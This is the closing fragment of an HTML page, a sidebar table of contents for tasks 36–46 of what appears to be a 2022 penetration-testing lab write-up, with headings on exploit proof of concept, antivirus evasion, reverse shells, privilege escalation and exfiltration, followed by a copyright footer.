        <li><a href="#task-36-personal-pc-website-code-analysis">Task 36: Personal PC Website Code Analysis</a></li>
        <li><a href="#task-37-personal-pc-exploit-poc">Task 37: Personal PC Exploit PoC</a></li>
        <li><a href="#task-38-av-evasion-introduction">Task 38: AV Evasion Introduction</a></li>
        <li><a href="#task-39-av-evasion-av-detection-methods">Task 39: AV Evasion AV Detection Methods</a></li>
        <li><a href="#task-40-av-evasion-php-payload-obfuscation">Task 40: AV Evasion PHP Payload Obfuscation</a></li>
        <li><a href="#task-41-av-evasion-compiling-netcat--reverse-shell">Task 41: AV Evasion Compiling Netcat &amp; Reverse Shell!</a></li>
        <li><a href="#task-42-av-evasion-enumeration">Task 42: AV Evasion Enumeration</a></li>
        <li><a href="#task-43-av-evasion-privilege-escalation">Task 43: AV Evasion Privilege Escalation</a></li>
        <li><a href="#task-44-av-evasion-exfiltration-techniques--post-exploitation">Task 44: AV Evasion Exfiltration Techniques &amp; Post Exploitation</a></li>
        <li><a href="#task-4546">Task 45–46:</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </nav>
</aside>



    

        </main><footer class="footer">
    <span>&copy; 2022 Mansoor Barri</span>

</footer>
</body>
</html>
